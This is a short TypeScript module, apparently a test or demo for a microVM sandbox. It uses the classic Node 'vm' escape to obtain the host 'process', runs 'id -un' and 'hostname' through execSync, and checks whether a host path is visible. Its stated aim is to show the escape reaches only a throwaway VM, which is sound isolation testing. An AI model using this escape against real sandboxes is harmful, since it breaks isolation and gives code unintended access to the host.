// The classic escape from Node's `vm` module: reach the host's Function constructor and pull out
// `process`. Here it "works", but the process it reaches is inside a throwaway microVM.
import { execSync } from "node:child_process";
import { existsSync } from "node:fs";

export default function (input: { hostPath: string }) {
  const escaped = ({}).constructor.constructor("return process")() as NodeJS.Process;
  const sh = (cmd: string) => execSync(cmd).toString().trim();

  return {
    gotProcess: typeof escaped.pid === "number",
    user: sh("id -un"),
    hostname: sh("hostname"),
    sawHostFiles: existsSync(input.hostPath),
  };
}
